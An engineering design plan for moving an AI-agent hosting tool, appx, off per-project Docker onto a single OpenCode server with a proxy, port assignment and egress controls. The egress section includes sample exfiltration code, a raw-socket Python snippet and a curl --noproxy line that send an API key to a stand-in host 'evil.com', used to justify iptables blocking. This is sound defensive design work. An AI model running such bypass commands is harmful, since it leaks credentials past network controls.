# Phase 5 Plan: De-Docker Simplification

**Date:** 2026-04-07
**Status:** Draft
**Scope:** Remove per-project Docker containers, single OpenCode server, simplified proxy, egress control, `--http` dev mode
**Analysis:** See [`docs/analysis/refactors/de-docker-refactor.md`](../analysis/refactors/de-docker-refactor.md) for full context, findings (F1–F3), and resolved questions (Q1–Q7).

---

## Vision

Replace per-project Docker containers with a single OpenCode server that manages multiple projects natively. Appx becomes a thin management shell — auth, subdomain proxy, egress control, app hosting, billing metadata — around OpenCode as the AI engine.

```
BEFORE (Phases 1–4):
  appx → N Docker containers → N OpenCode instances → complex SW proxy

AFTER (Phase 5):
  appx (Go binary, auth + proxy + egress + UI)
    ↕ HTTP (localhost:4096)
  opencode serve (single process, multi-project)
    ↕ HTTPS_PROXY
  appx egress proxy (Go CONNECT proxy, logging + allowlist)
```

---

## Goals

1. **Remove per-project Docker** — delete container lifecycle, Dockerfile, port publishing, SW proxy, asset cache
2. **Single OpenCode server** — one `opencode serve` process manages all projects; appx communicates via HTTP API
3. **Simplified proxy** — OpenCode API proxied at `/api/opencode/*`, subdomain routing for agent-built apps; no SW, no HTML rewriting
4. **Egress control** — Go CONNECT proxy with logging and allowlist, wired via `HTTPS_PROXY` env var (Finding F1)
5. **`--http` dev mode** — safe HTTP-only mode locked to localhost for development
6. **Adapted project model** — appx assigns ports, health-checks apps, scaffolds `AGENTS.md` templates
7. **Cookie scoping** — `SameSite=Lax` with explicit `Domain` for cross-subdomain auth

---

## Architecture After Phase 5

```
Browser
  │
  ├── https://username.appx.app/            → appx dashboard (React SPA)
  │     /                                   → SPA (dashboard + agent interaction + egress logs)
  │     /api/*                              → appx REST API (auth, projects, settings)
  │     /api/opencode/*                     → reverse proxy → opencode serve :4096
  │     /ws/term/:id                        → terminal WebSocket
  │
  └── https://myapp.username.appx.app/      → reverse proxy → localhost:10001
        Agent-built app (dev server on appx-assigned port)

Dev mode (--http):
  http://localhost:8080/                    → SPA (dashboard + agent interaction)
  http://localhost:8080/api/opencode/*      → reverse proxy → localhost:4096
  http://myapp.localhost:8080/              → agent-built app

Server internals:
  appx process (user: appx)
  ├── Auth middleware (session cookie, Domain=.<base>, SameSite=Lax)
  ├── /api/opencode/* reverse proxy → localhost:4096 (strips prefix, forwards request)
  ├── Subdomain router (Host header dispatch for agent-built apps)
  ├── REST API (project CRUD, port assignment, health status)
  ├── Terminal WebSocket (Phase 3, unchanged)
  ├── Go CONNECT proxy (:9080, egress logging + allowlist)
  └── OpenCode health checker (GET /global/health polling)

  opencode process (user: opencode, systemd)
  ├── opencode serve :4096
  ├── HTTPS_PROXY=http://127.0.0.1:9080
  ├── NO_PROXY=localhost,127.0.0.1
  └── Multi-project, multi-session
```

Agent interaction is built into appx's own SPA using the OpenCode SDK (`@opencode-ai/sdk`). The SDK calls go through `/api/opencode/*` which appx proxies to `localhost:4096`. This means:
- One cohesive UI — no separate subdomain for the agent
- Shared React components reusable across web, mobile (React Native), and desktop (Electron/Tauri)
- Full design control — appx aesthetic, not OpenCode's
- No SPA-at-root proxy problem — OpenCode's web UI is not served to the browser at all

---

## Implementation Steps

### Step 1: Delete Docker code

Remove all container-related code. This is the largest deletion and makes subsequent steps cleaner.

**Files to delete:**
- `internal/proxy/` — entire package (proxy.go, assets.go, assets_test.go, ws.go, proxy_test.go)
- `internal/project/container.go` — Docker lifecycle
- `internal/project/Dockerfile.project` — base image
- `internal/project/.tmux.conf` — container tmux config
- `internal/project/fake_docker_test.go` — Docker mock
- `internal/project/manager_test.go` — container manager tests

**Files to clean up:**
- `go.mod` / `go.sum` — remove `github.com/moby/moby/client` and transitive Docker dependencies
- `cmd/appx/main.go` — remove container manager initialization, startHook wiring, Docker client creation
- `internal/server/router.go` — remove `/agent/`, `/api/agent/`, `/apps/` route registrations
- `internal/server/project_handlers.go` — remove start/stop/reset/delete handlers that call container manager
- `web/src/` — remove SW-related code, iframe agent embedding, container-specific UI

**Verification:** `task build` compiles. `task test` passes (many tests will need deletion/adaptation). The app runs but project create/start/stop are broken (expected — fixed in Step 3).

### Step 2: `--http` mode, OpenCode API proxy, and subdomain routing

Add HTTP dev mode, OpenCode API pass-through, and subdomain dispatch for agent-built apps.

**`cmd/appx/main.go`:**
- New `--http` flag, mutually exclusive with `--domain`
- In HTTP mode: bind to `127.0.0.1` only, refuse public interfaces, log warning, no HSTS
- In domain mode: HTTPS with Let's Encrypt (existing CertMagic path) or self-signed for localhost

**`internal/server/router.go`:**
- Base domain routes (e.g. `username.appx.app` or `localhost:8080`):
  - `/` → appx React SPA (dashboard + agent interaction)
  - `/api/opencode/*` → reverse proxy to `localhost:4096` (strip prefix, auth required). This is how the browser-side OpenCode SDK reaches the OpenCode server. Also carries terminal WebSocket traffic (`/api/opencode/pty/:id/connect`).
  - `/api/*` → appx REST API (auth, projects, settings, egress)
- Subdomain routes (e.g. `myapp.username.appx.app` or `myapp.localhost:8080`):
  - `<name>.<base>` → reverse proxy to assigned app port (from DB)
  - Unknown subdomain → 404
- All routes go through auth middleware

**`internal/auth/auth.go`:**
- `SetSessionCookie` uses `Domain=.<baseDomain>` and `SameSite=Lax`
- `baseDomain` derived from `--domain` flag or `localhost` in `--http` mode

**Verification:** `./appx --http --port 8080` starts. `http://localhost:8080` serves the dashboard. `http://localhost:8080/api/opencode/global/health` returns 502 (OpenCode not running yet — expected). Cookie has correct Domain and SameSite attributes.

### Step 3: Adapted project model

Rework project CRUD to work without Docker. Projects become directories with metadata.

**DB migration 4:**
- Drop `container_id`, `container_secret` columns
- Add `assigned_port` (INTEGER, unique, from range 10000–10999)
- Add `opencode_project_id` (TEXT, nullable — populated when OpenCode discovers the project)

**`internal/project/store.go`:**
- `Create` → allocate next available port from range, create project directory, `git init`, scaffold `AGENTS.md` template, initial commit (git repo is required for OpenCode to discover it as a project)
- `Delete` → remove project directory + DB record
- Remove `TransitionStatus`, `SetContainerID`, `SetContainerSecret`, `ContainerAddr` — all Docker-specific
- Add `GetBySubdomain(name)` — used by subdomain router
- Add `UpdateOpenCodeProjectID(id, ocProjectID)` — set mapping after OpenCode discovers project

**`internal/project/project.go`:**
- Remove `ContainerID`, `ContainerSecret` fields
- Add `AssignedPort`, `OpenCodeProjectID` fields
- Remove Docker status constants (`StatusStarting`, `StatusStopping`, etc.) — projects are always "available" since OpenCode server is always running
- Add `AppRunning bool` (populated by health checker, not persisted)

**`internal/server/project_handlers.go`:**
- `handleCreateProject` → create directory, scaffold files, return project with assigned port
- `handleDeleteProject` → remove directory + DB record
- Remove `handleStartProject`, `handleStopProject`, `handleResetProject` — no container lifecycle
- Add `handleListProjects` → return projects with `AppRunning` status from health checker

**`AGENTS.md` template** (scaffolded into each new project):
```markdown
# Project: {{name}}

## App Port
When running a dev server, always use port {{port}}.
This port is assigned by appx and has proxy routing configured.
Your app will be accessible at {{subdomain}}.
```

**Verification:** Create a project via API → directory created, `AGENTS.md` has correct port, DB has `assigned_port`. Delete a project → directory and DB record removed. List projects returns correct data.

### Step 4: App health checker

Detect whether agent-built apps are running on their assigned ports.

**`internal/project/health.go`** (new file):
- `HealthChecker` struct with a `Check(projects []Project) map[string]bool`
- TCP dial to `127.0.0.1:<assigned_port>` with 500ms timeout
- Called on dashboard poll cycle (existing polling mechanism)
- Results merged into project list API response as `app_running: true/false`

**`internal/server/project_handlers.go`:**
- `handleListProjects` includes `app_running` in response
- Proxy for app subdomains returns friendly "app not running" page when health check fails, instead of raw 502

**Verification:** Start a simple HTTP server on a project's assigned port → dashboard shows "App: running". Stop it → shows "not started". Hit the subdomain directly → friendly page or proxied content.

### Step 5: OpenCode integration

Wire appx to communicate with the OpenCode server.

**`internal/opencode/client.go`** (new package):
- Thin Go HTTP client for OpenCode's REST API (health check, project list, auth set)
- `HealthCheck()` → `GET /global/health`
- `ListProjects()` → `GET /project`
- `SetAuth(providerID, apiKey)` → `POST /auth` (inject Anthropic API key)
- Used by appx Go backend for server-side operations (health monitoring, API key injection)

**`cmd/appx/main.go`:**
- On startup: poll OpenCode health endpoint until available
- Once OpenCode is up: inject Anthropic API key via `SetAuth`
- Periodic health check: if OpenCode goes down, mark UI accordingly

**`web/src/`:**
- Frontend uses OpenCode SDK (`@opencode-ai/sdk`) for agent interactions (sessions, events, permissions)
- SDK initialized with `baseUrl` pointing to `/api/opencode` (appx proxies to OpenCode)
- Agent interaction is built into the appx SPA — sessions panel, chat interface, event stream, permission prompts
- These React components are designed for reuse across web, mobile (React Native), and desktop (Electron/Tauri)
- Appx's own API (`/api/*`) handles auth, project CRUD, settings, egress logs

**Verification:** Start appx + OpenCode. Dashboard shows OpenCode status as healthy. API key injection works (OpenCode can make Anthropic API calls). Frontend can create sessions and receive events via SDK.

### Step 6: Egress control (two-layer defense)

Egress control has two layers: a cooperative proxy for visibility/allowlisting, and OS-level enforcement to prevent bypass.

**Why two layers?** `HTTPS_PROXY` is a convention, not an OS-level mechanism. Only programs that respect the env var route through the proxy. A compromised agent can trivially bypass it:

```python
# Malicious script ignores HTTPS_PROXY, uses raw sockets
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("evil.com", 443))
s.send(stolen_api_key)      # Direct TCP — never touches the proxy
```

Or simply: `curl --noproxy '*' https://evil.com/exfil?key=...`

#### Layer 1: Go CONNECT proxy (visibility + allowlist)

**`internal/egress/proxy.go`** (new package):
- HTTP CONNECT proxy listening on `127.0.0.1:9080`
- Logs every connection attempt: timestamp, destination host, port, allowed/blocked
- Default allowlist: `api.anthropic.com:443`, `registry.npmjs.org:443`, `proxy.golang.org:443`
- User-configurable allowlist via appx settings API
- Blocked connections return 403 with log entry

**`internal/egress/store.go`:**
- Write to `egress_log` table (already exists in schema from Phase 1)
- Query API for dashboard display

**`internal/server/egress_handlers.go`:**
- `GET /api/egress/log` — paginated egress log for dashboard
- `GET /api/egress/allowlist` — current allowlist
- `PUT /api/egress/allowlist` — update allowlist

**OpenCode wiring:**
- OpenCode's systemd service has `Environment=HTTPS_PROXY=http://127.0.0.1:9080`
- `NO_PROXY=localhost,127.0.0.1` prevents routing loop (OpenCode UI ↔ OpenCode server)

#### Layer 2: iptables UID-based enforcement (hard block)

All outbound traffic from the `opencode` user is blocked at the kernel level, except to localhost (where the proxy lives). This makes proxy bypass impossible — even raw sockets, `--noproxy`, or malicious binaries can't reach the internet directly.

```bash
# Allow opencode user to reach localhost only (proxy + OpenCode server)
iptables -A OUTPUT -m owner --uid-owner opencode -d 127.0.0.1 -j ACCEPT
iptables -A OUTPUT -m owner --uid-owner opencode -d ::1 -j ACCEPT

# Block ALL other outbound from opencode user
iptables -A OUTPUT -m owner --uid-owner opencode -j REJECT
```

The traffic flow becomes:

```
Cooperative programs (npm, curl, pip, OpenCode):
  → HTTPS_PROXY routes to appx egress proxy (127.0.0.1:9080)
  → Proxy checks allowlist, logs, forwards allowed traffic
  → Proxy runs as 'appx' user → not blocked by iptables
  → Allowed traffic exits to internet ✓

Malicious/bypassing programs (raw sockets, --noproxy, compiled binaries):
  → Try direct outbound connection to evil.com
  → iptables blocks it (uid-owner = opencode) ✗
  → Connection refused. Never leaves the server.

Docker containers started by agent (rootless Docker):
  → Run under opencode user's UID namespace
  → Same iptables rule applies
  → Must also use HTTPS_PROXY to reach allowed destinations
```

**Implementation:** The iptables rules are set by the installer (Phase 6), not by appx code. Appx doesn't need root to benefit from them — the rules are persistent system config. In `--http` dev mode (localhost, no installer), the iptables layer is absent but the proxy layer still provides logging and allowlisting.

**Verification:**
- OpenCode makes Anthropic API call → routed through proxy → logged as allowed
- Agent runs `curl https://example.com` → proxy blocks with 403, logged
- Agent runs `curl --noproxy '*' https://example.com` → iptables blocks, connection refused
- Agent writes Python script with raw sockets → iptables blocks, connection refused
- Egress log visible in dashboard
- `appx` user (proxy process) can still reach the internet (not affected by iptables rule)

### Step 7: Frontend adaptation

Update the React SPA for the new architecture. Agent interaction is built directly into the appx dashboard — no separate OpenCode web UI, no subdomain for the agent.

**Dashboard:**
- Project list shows: name, assigned port, app health status (running/not started), app subdomain link
- No more start/stop/reset buttons (OpenCode is always running)
- "Create project" → name input, optional git URL
- "Delete project" → confirmation dialog
- OpenCode server health status indicator

**Agent interaction (built into dashboard via OpenCode SDK):**
- SDK client initialized with `baseUrl: "/api/opencode"` (proxied through appx to localhost:4096)
- Session list per project, create session, send prompts
- Real-time event stream (SSE) for agent activity
- Permission handling (approve/reject agent actions)
- These components are designed as reusable modules — same logic will be used by React Native (Phase 8) and desktop apps

**Egress log viewer:**
- Table of outbound connections with timestamp, destination, status (allowed/blocked)
- Allowlist editor

**Settings:**
- Anthropic API key management (stored in appx, injected into OpenCode via SDK)
- Terminal buffer size (existing)
- Egress allowlist (new)

**Verification:** Full end-to-end: login → create project → open agent session in dashboard → agent writes code → agent starts dev server on assigned port → app shows as running in dashboard → accessible via app subdomain.

---

## What Does NOT Change

- `internal/auth/store.go` — bcrypt cost 12, min password length 12, session CRUD
- `internal/terminal/` — may be removed if OpenCode's PTY has reconnect/replay support; otherwise kept as thin wrapper. See "Resolved: Terminal Without Docker" section.
- `internal/tls/` — self-signed cert generation (still used for default HTTPS mode)
- `internal/server/ratelimit.go` — rate limiting
- `internal/db/` — SQLite connection, migration runner (new migration 4 added)
- Auth event logging, body size limits

---

## Database Changes

**Migration 4** (`000004_de_docker.up.sql`):

```sql
-- Remove Docker-specific columns
ALTER TABLE projects DROP COLUMN container_id;
ALTER TABLE projects DROP COLUMN container_secret;

-- Add new columns
ALTER TABLE projects ADD COLUMN assigned_port INTEGER UNIQUE;
ALTER TABLE projects ADD COLUMN opencode_project_id TEXT;
```

Note: SQLite doesn't support `DROP COLUMN` before version 3.35.0. If targeting older SQLite, recreate the table. `modernc.org/sqlite` supports this.

---

## Security Considerations

- **OS user separation** — appx runs as `appx` user, OpenCode as `opencode` user (see Q5 in analysis doc). Enforced by systemd, not by appx code. Installer (Phase 6) creates users and sets permissions.
- **Rootless Docker** — recommended for agent Docker access. Installer configures this. Not enforced by appx code.
- **Egress control (two layers)** — Layer 1: Go CONNECT proxy for visibility, logging, and allowlist enforcement (`HTTPS_PROXY`). Layer 2: iptables UID-based rules block all direct outbound from `opencode` user except to localhost. Together they prevent both cooperative and malicious exfiltration. Allowlist defaults to minimal (Anthropic API only). User can expand.
- **Cookie scoping** — `SameSite=Lax` with `Domain=.<base>` is weaker than `SameSite=Strict`. Acceptable because all subdomains are controlled by the same appx instance on the same server. CSRF is mitigated by `Lax` (no cross-site POST).
- **`--http` mode** — locked to `127.0.0.1`, mutually exclusive with `--domain`. Cannot be accidentally used in production.

---

## Implementation Order and Dependencies

```
Step 1: Delete Docker code          ← no dependencies, do first
    ↓
Step 2: --http mode + subdomain routing  ← needs Step 1 (routes cleaned up)
    ↓
Step 3: Adapted project model       ← needs Step 2 (subdomain router references projects)
    ↓
Step 4: App health checker          ← needs Step 3 (projects have assigned ports)
    ↓
Step 5: OpenCode integration        ← needs Step 2 (subdomain proxy to :4096)
    ↓
Step 6: Egress proxy                ← independent, can parallel with Steps 4-5
    ↓
Step 7: Frontend adaptation         ← needs Steps 3-6 (all backend APIs ready)
```

Steps 4, 5, and 6 can be developed in parallel once Steps 1–3 are complete.

---

## Verification Checklist

```
[ ] task build — compiles cleanly (no Docker dependencies)
[ ] task test — all tests pass (Docker tests deleted, new tests written)
[ ] go.sum has no moby/docker references
[ ] ./appx --http --port 8080 starts, serves dashboard at http://localhost:8080
[ ] ./appx --http --domain foo fails with mutual exclusion error
[ ] http://localhost:8080/api/opencode/global/health proxies to OpenCode (requires OpenCode running)
[ ] Create project via API → directory created, AGENTS.md has correct port
[ ] Delete project via API → directory and DB record removed
[ ] Start dev server on assigned port → dashboard shows "App: running"
[ ] http://myapp.localhost:8080 proxies to the dev server
[ ] http://myapp.localhost:8080 without active session → redirect to login
[ ] OpenCode health check shows status in dashboard
[ ] API key injected via SDK → OpenCode can call Anthropic API
[ ] Agent makes outbound request via proxy → logged in egress log
[ ] Blocked outbound request via proxy → 403, logged as blocked
[ ] Direct outbound bypass attempt (curl --noproxy) → iptables blocks, connection refused
[ ] Raw socket bypass attempt → iptables blocks, connection refused
[ ] appx process can still reach internet (not affected by iptables rule)
[ ] Egress log visible in dashboard
[ ] Cookie has Domain=.localhost and SameSite=Lax in HTTP mode
[ ] Full flow: login → create project → agent session → agent builds app → app accessible via subdomain
```

---

## Resolved Investigation: OpenCode Project Discovery

OpenCode discovers projects **automatically on-demand**, not by filesystem scanning. The mechanism (from source: `packages/opencode/src/project/project.ts`):

1. When an API request includes a `directory` parameter (or `x-opencode-directory` header), OpenCode calls `Project.fromDirectory(dir)`
2. It searches upward from that directory for a `.git` folder
3. If found: generates a stable project ID from the git root commit hash (SHA-256), upserts into its own SQLite DB
4. If no `.git` found: assigns the special `"global"` project ID

**No registration API exists.** Projects appear when you create a session targeting a directory. No `opencode.json` or config file is required — git is the only requirement.

**What appx does on "create project":**
1. `mkdir /home/opencode/projects/myapp/`
2. `git init && git add . && git commit` (makes it a git repo → discoverable)
3. Scaffold `AGENTS.md` with assigned port
4. First session creation triggers OpenCode auto-discovery
5. Read back the OpenCode project ID from `GET /project` and store in appx DB

---

## Resolved: Terminal Without Docker

**Decision: delegate to OpenCode's built-in PTY (`/pty/:id/connect`).**

The terminal runs as the `opencode` user, which is the correct permission level for project work:
- Edit project files, run dev servers, use git, run Docker (rootless), install project packages — all works
- Can't modify appx files, restart appx, or break the management layer — same sandboxing that protects appx from agents
- Consistent security model: terminal user = agent user = `opencode`

For server administration (restart services, system logs, system packages), SSH exists. Appx doesn't need to provide admin terminals.

**Code simplification:** appx's `internal/terminal/` package (ring buffer, session manager, WebSocket handler, idle timeouts, output pump, resize) can potentially be removed. The terminal becomes a WebSocket proxy through `/api/opencode/pty/:id/connect`. OpenCode manages the PTY lifecycle.

**Caveat to verify during implementation:** does OpenCode's PTY support reconnect with output replay (equivalent to appx's ring buffer)? If not, appx may keep a thin WebSocket wrapper with the ring buffer. But this is an implementation detail — the architectural decision is to delegate to OpenCode's PTY.

---

## Resolved: Data Migration

**For the test Hetzner server (no real users):** delete containers, delete `data/`, fresh start. No migration needed.

**For future real users:** the migration runner in `internal/db/db.go` already handles this. Migration 4 ships with the Phase 5 release. On startup, appx detects the schema is at version 3, runs migration 4 (drop Docker columns, add `assigned_port` + `opencode_project_id`), and starts normally. Upgrade notes: "stop all containers before upgrading — they will not be managed after the update."

---

## Resolved: Allowlist Granularity

**Global allowlist for Phase 5.** One allowlist shared across all projects, enforced by appx's Go CONNECT proxy. The proxy is the decision point — when it receives a `CONNECT host:port` request, it checks the allowlist and either tunnels (allowed) or returns 403 (blocked). iptables is the backstop that prevents bypassing the proxy, but doesn't know about the allowlist itself.

Default allowlist: `api.anthropic.com`, `registry.npmjs.org`, `proxy.golang.org`. User-configurable via settings API. Per-project allowlists deferred to a later phase.

---

## Resolved: OpenCode API from Go

**Plain `net/http` calls.** The Go backend only needs ~3 endpoints (health check, list projects, set auth). Simple JSON request/response — no SDK, no code generation, no OpenAPI binding. The TypeScript SDK (`@opencode-ai/sdk`) is for the frontend only. If more Go-side endpoints are needed later, add plain functions.
